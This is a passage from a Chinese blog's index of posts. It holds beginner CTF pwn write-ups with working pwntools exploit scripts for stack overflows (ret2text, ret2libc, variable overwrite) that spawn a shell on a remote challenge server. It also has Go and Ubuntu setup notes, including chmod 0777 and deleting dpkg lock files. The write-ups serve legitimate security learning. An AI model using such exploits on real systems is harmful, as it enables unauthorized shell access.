键程序就在断点处断下了</p><pre><code>x /x $ebp-0xcx /s $ebp-0xc</code></pre><p>查看modified变量的值已经被修改成了0x00000042，</p><p>而0x42就是字符’B’的ASCII值，表明我们成功用输入数据的第65个字节覆盖了modified变量：</p><pre><code>nini</code></pre><p>在gdb中连续两次执行ni命令，可以看到je指令没有跳转，说明modified的值不为0，程序进入输出通过信息的if语句分支：</p><p>在gdb中输入c命令就可以让程序继续执行，看到输出了通过提示信息：</p><pre><code>Congratulations, you pwned it.</code></pre><p>即$ebx-0x1294处字符串</p><pre><code>x /s $ebx-0x1294</code></pre><p>通过上面的步骤我们已经知道了如何控制输入数据来进行攻击，以达到进入if语句分支的目的。下面我们就可以通过构造输入数据进行攻击了。</p><p>python -c “print ‘A’*64+’B’” | ./pwn</p><p>参考 <a href="https://www.freesion.com/article/9259443566/">https://www.freesion.com/article/9259443566/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go错误 cannot refer to unexported name</title>
      <link href="2020/08/21/2020-08-21-go_export_error/"/>
      <url>2020/08/21/2020-08-21-go_export_error/</url>
      
        <content type="html"><![CDATA[<p>cannot refer to unexported name</p><p>模块中要导出的函数，必须首字母大写。</p><p>因此需要先牢记这样的规则:小写字母开头的函数只在本包内可见,大写字母开头的函数才能被其他包使用。</p><p>这个规则也适用于类型和变量的可见性。</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu18.04安装Go语言</title>
      <link href="2020/08/21/2020-08-21-ubuntu_install_go/"/>
      <url>2020/08/21/2020-08-21-ubuntu_install_go/</url>
      
        <content type="html"><![CDATA[<p>Go是由Google创建的现代开源编程语言。 Go中编写了许多流行的应用程序，包括Kubernetes，Docker和Grafana。</p><ol><li>下载go并解压缩</li></ol><p>到Go官网下载Go安包，下载地址<a href="https://golang.org/dl/%E3%80%82%E6%88%91%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%98%AF%E6%9C%80%E6%96%B0%E7%9A%84go-1.15%E3%80%82%E9%80%89%E6%8B%A9%E7%9A%84%E6%98%AFlinux">https://golang.org/dl/。我直接下载的是最新的go-1.15。选择的是linux</a> 64位版本：go1.15.linux-amd64.tar.gz</p><p>国内比较快的下载链接，通过golang中文社区进行下载：<a href="https://studygolang.com/dl">Go安装包下载</a></p><p>解压缩go1.15.linux-amd64.tar.gz</p><pre><code>$ tar -zxvf go1.15.linux-amd64.tar.gz</code></pre><p>将解压后的文件夹，放到自己平常的安装包位置，并设置0777权限</p><pre><code>$ sudo cp -rf go /usr/local$ cd /usr/local$ sudo chmod -R 0777 go</code></pre><ol start="2"><li>配置go环境变量</li></ol><p>go语言的环境变量配置，需要两个值：</p><pre><code>GOROOT是系统上安装Go软件包的位置GOPATH是工作目录的位置</code></pre><p>创建工作目录，我选择创建在/home/go_project目录下</p><pre><code>$ mkdir GOPATH$ sudo chmod -R 0777 GOPATH</code></pre><p>使用sudo gedit ~/.bashrc命令修改环境变量，在弹出的记事本中添加以下内容。同时也在GOPATH目录下创建src和bin目录。</p><pre><code>export GOROOT=/usr/local/go #GOROOT是系统上安装Go软件包的位置。export GOPATH=/home/go_project #GOPATH是工作目录的位置。export PATH=$GOPATH/bin:$GOROOT/bin:$PATH</code></pre><p>使用一下命令使环境变量生效，并可以查看环境变量</p><pre><code>$ source ~/.bashrc$ export</code></pre><ol start="3"><li>验证go安装是否成功</li></ol><p>输入以下命令查看go版本，顺便验证go是否安装成功。</p><pre><code>$ go version</code></pre><p>编写hello程序，验证go安装是否成功。</p><p>在GOPATH目录下创建hello目录，用于存放go的第一个程序。</p><p>在hello目录下，创建hello.go文件，内容如下：</p><pre><code>package helloimport &quot;fmt&quot;func main() &#123;    fmt.Printf(&quot;Hello, World\n&quot;)&#125;</code></pre><p>切换到hello.go的目录，并运行hello.go文件。</p><pre><code>$ cd ~/GOPATH/hello  // 切换到`hello.go`的目录$ go run hello.go    // 运行`hello.go`文件</code></pre><p>也可以使用go build编译go文件的方式执行程序</p><pre><code>$ cd ~/GOPATH/hello # 切换到`hello.go`的目录$ go build    # 编译`hello.go`文件，得到一个名为hello的可执行文件$ ./hello     # 执行名为hello的可执行文件</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell多窗口</title>
      <link href="2020/08/20/2020-08-20-shell_multi_window/"/>
      <url>2020/08/20/2020-08-20-shell_multi_window/</url>
      
        <content type="html"><![CDATA[<ol><li><p>用正常的方式ctrl+alt+t打开一个终端。</p></li><li><p>使用组合键 ctrl+shift+t , 这时就在同一个窗口中打开了另一个终端，当然再按一次ctrl+shift+t，会再生成一个，需要多少了大家可以自行决定。</p></li><li><p>按组合键Alt+1，就会切换到第一个终端，按Alt+2，就会切换到第2个终端，Alt+n,对应的就会切换到第n个终端。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装pwntools</title>
      <link href="2020/08/19/2020-08-19-pwntools_install/"/>
      <url>2020/08/19/2020-08-19-pwntools_install/</url>
      
        <content type="html"><![CDATA[<h2 id="python2安装pwntools"><a href="#python2安装pwntools" class="headerlink" title="python2安装pwntools"></a>python2安装pwntools</h2><p>更新pip</p><pre><code>python -m pip install --upgrade pip -i https://pypi.douban.com/simple/</code></pre><p>安装pwntools</p><pre><code>pip install --upgrade pwntools -i https://pypi.douban.com/simple/</code></pre><p>遇到问题：</p><pre><code>Installing collected packages: capstone, ropgadget, psutil, intervaltree, pyelftools, pwntoolsAttempting uninstall: capstone    Found existing installation: capstone 3.0.4ERROR: Cannot uninstall &#39;capstone&#39;. It is a distutils installed project and thus we cannot accurately determine which files belong to it which would lead to only a partial uninstall.</code></pre><p>跳过capstone包安装</p><pre><code>pip install --upgrade pwntools --ignore-installed capstone -i https://pypi.douban.com/simple/</code></pre><p>测试</p><pre><code>pythonfrom pwn import *asm(&quot;xor eax,eax&quot;) </code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 pwn新手题 level0(ret2text)</title>
      <link href="2020/08/18/2020-08-18-CTF_world_pwn_newbee_level0/"/>
      <url>2020/08/18/2020-08-18-CTF_world_pwn_newbee_level0/</url>
      
        <content type="html"><![CDATA[<p>下载文件后改名为level0</p><p>进行通过file判断附件文件类型</p><pre><code>file level0 level0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped</code></pre><p>checksec一下，检查一下保护机制</p><pre><code>root@kali:~/CTF# checksec level0[*] &#39;/root/CTF/level0&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)【1】RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表,设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限【2】Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过【3】NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过【4】PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 </code></pre><p>64位程序，发现只开启了NX(数据不可执行)保护机制，因此可以做栈溢出漏洞攻击。运行一下</p><pre><code>Hello, Worldaaa</code></pre><p>将下载文件放到IDApro中，在其中发现了main、vulnerable_function、callsystem函数，逐个查看这三个函数。</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)&#123;    write(1, &quot;Hello, World\n&quot;, 0xDuLL);    return vulnerable_function();&#125;</code></pre><p>main函数只有两行，程序执行后输出“helloworld”就执行vulnerable_function()函数。函数中无参数传入，buf长度为0x80，即0x80h填充满，之后跟上地址就可以实现任意跳转。</p><pre><code>ssize_t vulnerable_function()&#123;char buf[128]; // [rsp+0h] [rbp-80h]return read(0, buf, 512uLL);&#125;</code></pre><p>查看有价值的strings(快捷键为shift+F12)。可以看到除了“Hello,World”,还发现了“/bin/sh”，双击查看调用发现了callsystem函数，我们可以把返回地址覆盖成callsystem的地址(400596)，这样便可以实现漏洞的利用。</p><pre><code>int callsystem()&#123;return system(&quot;/bin/sh&quot;);&#125;</code></pre><p>通过 cyclic 插件。⽣成⼀定⻓度的有规律字符串，作为输⼊喂进去，⻓度⾜够⼤那么必然会覆盖返回地址，但返回地址⽆效，所以程序崩掉。</p><pre><code>cyclic 200gdb-peda$ rStarting program: /root/CTF/level0 Hello, WorldaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabProgram received signal SIGSEGV, Segmentation fault.[----------------------------------registers-----------------------------------]RAX: 0xc9 RBX: 0x0 RCX: 0x7ffff7b06061 (&lt;__GI___libc_read+17&gt;:    cmp    rax,0xfffffffffffff000)RDX: 0x200 RSI: 0x7fffffffe060 (&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;...)RDI: 0x0 RBP: 0x6261616962616168 (&#39;haabiaab&#39;)RSP: 0x7fffffffe0e8 (&quot;jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\005@&quot;)RIP: 0x4005c5 (&lt;vulnerable_function+31&gt;:    ret)R8 : 0x7ffff7dd3d80 --&gt; 0x0 R9 : 0x7ffff7dd3d80 --&gt; 0x0 R10: 0x39c R11: 0x246 R12: 0x4004a0 (&lt;_start&gt;:    xor    ebp,ebp)R13: 0x7fffffffe1e0 --&gt; 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]0x4005ba &lt;vulnerable_function+20&gt;:    mov    edi,0x00x4005bf &lt;vulnerable_function+25&gt;:    call   0x400470 &lt;read@plt&gt;0x4005c4 &lt;vulnerable_function+30&gt;:    leave  =&gt; 0x4005c5 &lt;vulnerable_function+31&gt;:    ret    0x4005c6 &lt;main&gt;:    push   rbp0x4005c7 &lt;main+1&gt;:    mov    rbp,rsp0x4005ca &lt;main+4&gt;:    sub    rsp,0x100x4005ce &lt;main+8&gt;:    mov    DWORD PTR [rbp-0x4],edi[------------------------------------stack-------------------------------------]0000| 0x7fffffffe0e8 (&quot;jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\005@&quot;)0008| 0x7fffffffe0f0 (&quot;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\005@&quot;)0016| 0x7fffffffe0f8 (&quot;naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\005@&quot;)0024| 0x7fffffffe100 (&quot;paabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\005@&quot;)0032| 0x7fffffffe108 (&quot;raabsaabtaabuaabvaabwaabxaabyaab\n\005@&quot;)0040| 0x7fffffffe110 (&quot;taabuaabvaabwaabxaabyaab\n\005@&quot;)0048| 0x7fffffffe118 (&quot;vaabwaabxaabyaab\n\005@&quot;)0056| 0x7fffffffe120 (&quot;xaabyaab\n\005@&quot;)</code></pre><p>当前程序执⾏到ret，ret的作⽤是把当前栈顶加载到eip，即弹出返回地址。可以看到当前栈顶⾥存的内容为</p><p>‘jaabkaablaabmaab\n’ ，通过 cyclic -l jaab 的结果就能得出buf到ret的地址为0x88，即 0x80+8</p><p>或者使用 pada中的pattern </p><pre><code>gdb-peda$ pattern create 200gdb-peda$ pattern offset AAQAAmAARAAoAASAApAAAAQAAmAARAAoAASAApAA found at offset: 136</code></pre><p>利用python编写脚本如下：</p><pre><code># coding=utf-8from pwn import *    #导入pwntools中pwn包的所有内容p = remote(&#39;220.249.52.133&#39;,40623)    # 链接服务器远程交互p.sendline(&#39;a&#39;*128+&#39;a&#39;*8+p64(0x400596)) # 0x400596为callsystem地址,主要要覆盖 rbp 本身 8 位p.interactive()</code></pre><p>执⾏脚本，获取flag</p><pre><code>cat flag</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 pwn新手题 level2(ret2libc)</title>
      <link href="2020/08/18/2020-08-18-CTF_world_pwn_newbee_level2/"/>
      <url>2020/08/18/2020-08-18-CTF_world_pwn_newbee_level2/</url>
      
        <content type="html"><![CDATA[<p>下载文件后改名为level2</p><p>file一下</p><pre><code>root@kali:~/CTF# file level2level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</code></pre><p>checksec一下</p><pre><code>root@kali:~/CTF# checksec level2[*] &#39;/root/CTF/level2&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>nc连接一下</p><pre><code>root@kali:~/CTF# nc 220.249.52.133 43422Input:123Hello World!</code></pre><p>ida 32位</p><p>main函数</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)&#123;vulnerable_function();system(&quot;echo &#39;Hello World!&#39;&quot;);return 0;&#125;</code></pre><p>vulnerable_function</p><pre><code>ssize_t vulnerable_function()&#123;char buf; // [esp+0h] [ebp-88h]system(&quot;echo Input:&quot;);return read(0, &amp;buf, 0x100u);&#125;</code></pre><p>在vulnerable_function()中可以发现,缓冲区0x88，允许读入0x100,明显的缓冲区溢出。</p><p>然后在shift + F12看一下字符串</p><pre><code>LOAD:08048154    00000013    C    /lib/ld-linux.so.2LOAD:0804822D    0000000A    C    libc.so.6LOAD:08048237    0000000F    C    _IO_stdin_usedLOAD:08048246    00000005    C    readLOAD:0804824B    00000007    C    systemLOAD:08048252    00000012    C    __libc_start_mainLOAD:08048264    0000000F    C    __gmon_start__LOAD:08048273    0000000A    C    GLIBC_2.0.rodata:08048540    0000000C    C    echo Input:.rodata:0804854C    00000014    C    echo &#39;Hello World!&#39;.eh_frame:080485CB    00000005    C    ;*2$\&quot;.data:0804A024    00000008    C    /bin/sh</code></pre><p>看到了两个关键字符串，一个是system还有一个就是/bin/sh</p><p>发现/bin/sh字符串在0x804A024，名为hint。system函数的地址是0x8048320。</p><p>所以我们需要做的就是调用system(“/bin/sh”),就可以实现获取shell。</p><p>构造ROP链</p><p>计算一下偏移量：</p><pre><code>-00000088 buf             db 136 dup(?)+00000000  s              db 4 dup(?)+00000004  r              db 4 dup(?)</code></pre><p>看样子就是需要填满的的buf为0x88+0x4</p><p>构造一个system(“/bin/sh”)的伪栈帧</p><p>通过控制vulnerable_function()返回到该伪栈帧执行system(“/bin/sh”)来get shell</p><p>然后把system以及bin/sh构造进payload</p><p>payload = ‘a’ * (0x88 + 0x4) + p32(sys_addr) + p32(0) + p32(bin_addr)</p><p>其中p32(0)为system(“/bin/sh”)执行后的返回地址，整上个0就能行。</p><p>最后的exp：</p><pre><code>from pwn import *p = remote(&#39;220.249.52.133&#39;,43422)#p = process(&quot;./pwn003&quot;)bin_addr= 0x0804A024sys_addr= 0x8048320payload = &quot;A&quot;*0x88+&quot;B&quot;*0x4+p32(sys_addr)+p32(0)+p32(bin_addr)p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF攻防世界 pwn新手题 when_did_you_born</title>
      <link href="2020/08/18/2020-08-18-CTF_world_pwn_newbee_when_did_you_born/"/>
      <url>2020/08/18/2020-08-18-CTF_world_pwn_newbee_when_did_you_born/</url>
      
        <content type="html"><![CDATA[<p>下载文件后改名为when_did_you_born</p><p>进行通过file判断附件文件类型</p><pre><code>file when_did_you_bornwhen_did_you_born: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped</code></pre><p>checksec一下，检查一下保护机制</p><pre><code>root@kali:~/CTF# checksec when_did_you_born[*] &#39;/root/CTF/when_did_you_born&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>nc连接(或者本地运行)，尝试运行一下，看看都有什么功能</p><pre><code>nc 220.249.52.133 35714</code></pre><p>然后放入IDA中，找到main函数，F5</p><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;__int64 result; // raxchar v4; // [rsp+0h] [rbp-20h]unsigned int v5; // [rsp+8h] [rbp-18h]unsigned __int64 v6; // [rsp+18h] [rbp-8h]v6 = __readfsqword(0x28u);setbuf(stdin, 0LL);setbuf(stdout, 0LL);setbuf(stderr, 0LL);puts(&quot;What&#39;s Your Birth?&quot;);__isoc99_scanf(&quot;%d&quot;, &amp;v5);while ( getchar() != 10 )    ;if ( v5 == 1926 )&#123;    puts(&quot;You Cannot Born In 1926!&quot;);    result = 0LL;&#125;else&#123;    puts(&quot;What&#39;s Your Name?&quot;);    gets(&amp;v4);    printf(&quot;You Are Born In %d\n&quot;, v5);    if ( v5 == 1926 )    &#123;    puts(&quot;You Shall Have Flag.&quot;);    system(&quot;cat flag&quot;);    &#125;    else    &#123;    puts(&quot;You Are Naive.&quot;);    puts(&quot;You Speed One Second Here.&quot;);    &#125;    result = 0LL;&#125;return result;&#125;</code></pre><p>分析：</p><p>分析发现只要v5等于1926就可以成功输出flag，但是第一次输入的时候v5不能等于1926，下面存在gets函数，发现get(&amp;v4)这个地方可以作为溢出点（get函数没有做任何限制），只需要在输入v4（name）的时候覆盖掉原来的v5的值，替换为1926即可达到目的。</p><pre><code>-0000000000000020 v4              db ?-000000000000001F                 db ? ; undefined-000000000000001E                 db ? ; undefined-000000000000001D                 db ? ; undefined-000000000000001C                 db ? ; undefined-000000000000001B                 db ? ; undefined-000000000000001A                 db ? ; undefined-0000000000000019                 db ? ; undefined-0000000000000018 v5              dd ?-0000000000000014                 db ? ; undefined-0000000000000013                 db ? ; undefined-0000000000000012                 db ? ; undefined-0000000000000011                 db ? ; undefined-0000000000000010                 db ? ; undefined-000000000000000F                 db ? ; undefined-000000000000000E                 db ? ; undefined-000000000000000D                 db ? ; undefined-000000000000000C                 db ? ; undefined-000000000000000B                 db ? ; undefined-000000000000000A                 db ? ; undefined-0000000000000009                 db ? ; undefined-0000000000000008 v6              dq ?</code></pre><p>v4 v5相差8个字节</p><p>编写exp，获取flag</p><pre><code>from pwn import *r = remote(&quot;220.249.52.133&quot;, 35714)payload = &#39;a&#39; * 8 + p64(1926)r.recvuntil(&quot;What&#39;s Your Birth?\n&quot;)r.sendline(&quot;2000&quot;)r.recvuntil(&quot;What&#39;s Your Name?\n&quot;)r.sendline(payload)r.interactive()</code></pre><p>gdb调试：</p><pre><code>[----------------------------------registers-----------------------------------]RAX: 0x778 RBX: 0x0 RCX: 0x0 RDX: 0x0 RSI: 0x7fffffffb8e0 (&quot;You Are Born In 1912\n&quot;)RDI: 0x7ffff7faa670 --&gt; 0x0 RBP: 0x7fffffffdf80 --&gt; 0x400950 (push   r15)RSP: 0x7fffffffdf60 --&gt; 0x61616161 (&#39;aaaa&#39;)RIP: 0x4008f5 (cmp    eax,0x786)R8 : 0x0 R9 : 0x15 R10: 0x7fffffffb774 --&gt; 0xf7e69d1e00000000 R11: 0x246 R12: 0x400730 (xor    ebp,ebp)R13: 0x0 R14: 0x0 R15: 0x0EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]0x4008e8:    mov    eax,0x00x4008ed:    call   0x4006d0 &lt;printf@plt&gt;0x4008f2:    mov    eax,DWORD PTR [rbp-0x18]=&gt; 0x4008f5:    cmp    eax,0x786(1926)0x4008fa:    jne    0x4009170x4008fc:    mov    edi,0x400a290x400901:    call   0x400690 &lt;puts@plt&gt;0x400906:    mov    edi,0x400a3e[------------------------------------stack-------------------------------------]0000| 0x7fffffffdf60 --&gt; 0x61616161 (&#39;aaaa&#39;)0008| 0x7fffffffdf68 --&gt; 0x778 (1912)0016| 0x7fffffffdf70 --&gt; 0x7fffffffe070 --&gt; 0x1 0024| 0x7fffffffdf78 --&gt; 0xfbe7e46ca282e700 0032| 0x7fffffffdf80 --&gt; 0x400950 (push   r15)0040| 0x7fffffffdf88 --&gt; 0x7ffff7e0fcca (&lt;__libc_start_main+234&gt;:    mov    edi,eax)0048| 0x7fffffffdf90 --&gt; 0x7fffffffe078 --&gt; 0x7fffffffe395 (&quot;/root/Desktop/ctf-world-pwn/when_did_you_born/when_did_you_born&quot;)0056| 0x7fffffffdf98 --&gt; 0x100000000 [------------------------------------------------------------------------------]Legend: code, data, rodata, value0x00000000004008f5 in ?? ()gdb-peda$ set $eax=0x786</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn入门</title>
      <link href="2020/08/18/2020-08-18-pwn_study/"/>
      <url>2020/08/18/2020-08-18-pwn_study/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn入门"><a href="#pwn入门" class="headerlink" title="pwn入门"></a>pwn入门</h1><p>前期做了攻防世界web题，现在准备着手学习做pwn的题。但打开一题，发现毫无头绪，查阅了相关writeup，也是看的云里雾里。所以自知基础欠缺太多，故打算边补欠缺的知识边实践。</p><h3 id="pwn简介"><a href="#pwn简介" class="headerlink" title="pwn简介"></a>pwn简介</h3><p>PWN指的是通过通过程序本身的漏洞，编写利用脚本破解程序拿到主机的权限，这就需要对程序进行分析，了解操作系统的特性和相关漏洞，是是一个难度比较大的分支。一般是在linux平台下通过二进制/系统调用等方式编写漏洞利用脚本exp来获取对方服务器的shell，然后get到flag。</p><h3 id="pwn、Reverse-amp-web关系"><a href="#pwn、Reverse-amp-web关系" class="headerlink" title="pwn、Reverse&amp;web关系"></a>pwn、Reverse&amp;web关系</h3><p>pwn和Reverse相对于web而言需要更专业的技能和知识，学会如何分析程序。逆向跟漏洞利用所需要掌握的均是逆向工程的底子，因此会发现其实很大一块都在二进制这，无论是逆向、pwn、密码学都与其有关系。逆向多为windows，少部分安卓，而pwn基本都是linux。</p><h3 id="基础知识准备"><a href="#基础知识准备" class="headerlink" title="基础知识准备"></a>基础知识准备</h3><p>对于pwn，需要哪些方面的知识呢？<strong>C语言、汇编语言、Python、操作系统、linux操作</strong>等。</p><p>C语言是最基础的，当下的比赛大部分的pwn题目使用的程序都是利用C语言或者C++完成的，IDA的反编译功能也是变成C/C++，理解并能运用C语言，对于分析程序有很大的帮助。</p><p>汇编语言，pwn是绕不过汇编的，分析程序首先面对的就是汇编，对于汇编需要有一定的基础，按照当下来说，使用的最多的是x86的汇编，然后就是IA32，掌握这两种汇编基本上就足够了。</p><p>python用来写exp，实际上exp每种语言都可以写，但是python集成了一个专门用于pwn的库–pwntools，更方便使用。</p><p>操作系统的知识也需要有一定的了解，特别是linux，栈和堆以及一些操作系统特性造成的漏洞。</p><p>linux操作，掌握基础操作。</p><h3 id="主流工具的使用"><a href="#主流工具的使用" class="headerlink" title="主流工具的使用"></a>主流工具的使用</h3><p>分析pwn会用到许多的工具，掌握并使用这些工具也是十分重要的。</p><pre><code>IDA pro    静态分析神器，必备。ollydbg    动态分析使用，分析程序的流程。windbg     windows下的动态分析神器，可以调试内核态，谨慎使用。gdb        linux下的调试程序，同样作用很大。pwntools   python第三方库，用于开发exp。pwndbg     gdb调试的一个插件，可以显示一些调试信息很有用。</code></pre><h3 id="经典漏洞学习"><a href="#经典漏洞学习" class="headerlink" title="经典漏洞学习"></a>经典漏洞学习</h3><p>pwn的几大主流漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">栈溢出</span><br><span class="line">堆溢出</span><br><span class="line">ROP</span><br><span class="line">格式化字符串漏洞</span><br><span class="line">其余漏洞</span><br></pre></td></tr></table></figure><h3 id="Shellcode编码"><a href="#Shellcode编码" class="headerlink" title="Shellcode编码"></a>Shellcode编码</h3><p>Shellcode是破解软件的一种方法，对于一些没有办法通过程序内部函数获取系统权限的软件，可以编写Shellcode来获取系统权限。</p><h3 id="书籍-amp-学习网站-amp-ctf刷题网站"><a href="#书籍-amp-学习网站-amp-ctf刷题网站" class="headerlink" title="书籍&amp;学习网站&amp;ctf刷题网站"></a>书籍&amp;学习网站&amp;ctf刷题网站</h3><pre><code>汇编语言第三版鸟哥的linux私房菜深入理解计算机系统黑客攻防技术宝典(系统实战篇) IDA pro权威指南  黑客反汇编解密  加密与解密 </code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">看雪论坛 https:&#x2F;&#x2F;bbs.pediy.com</span><br><span class="line">学破解论坛 https:&#x2F;&#x2F;www.xuepojie.com</span><br><span class="line">吾爱破解 https:&#x2F;&#x2F;www.52pojie.cn</span><br><span class="line">i春秋 https:&#x2F;&#x2F;www.ichunqiu.com</span><br><span class="line">实验吧 http:&#x2F;&#x2F;www.shiyanbar.com</span><br><span class="line">漏洞银行 https:&#x2F;&#x2F;www.bugbank.cn&#x2F;live</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">实验吧 http:&#x2F;&#x2F;www.shiyanbar.com</span><br><span class="line">i春秋 https:&#x2F;&#x2F;www.ichunqiu.com</span><br><span class="line">bugku https:&#x2F;&#x2F;ctf.bugku.com</span><br><span class="line">攻防世界 https:&#x2F;&#x2F;adworld.xctf.org.cn</span><br><span class="line">pwnable http:&#x2F;&#x2F;www.pwnable.kr&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu终端出现Unable to lock the administration directory (/var/lib/dpkg/), is another process using it?</title>
      <link href="2020/08/17/2020-08-17-ubuntu_apt_error/"/>
      <url>2020/08/17/2020-08-17-ubuntu_apt_error/</url>
      
        <content type="html"><![CDATA[<p>通过终端安装程序sudo apt-get install ***时出错： </p><pre><code>E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable) E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it? </code></pre><p>出现这个问题可能是有另外一个程序正在运行，导致资源被锁不可用。而导致资源被锁的原因可能是上次运行安装或更新时没有正常完成，进而出现此状况，解决的办法其实很简单：<br>在终端中敲入以下两句 </p><pre><code>sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock</code></pre>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu18.04安装binwalk</title>
      <link href="2020/08/17/2020-08-17-ubuntu_binwalk_install/"/>
      <url>2020/08/17/2020-08-17-ubuntu_binwalk_install/</url>
      
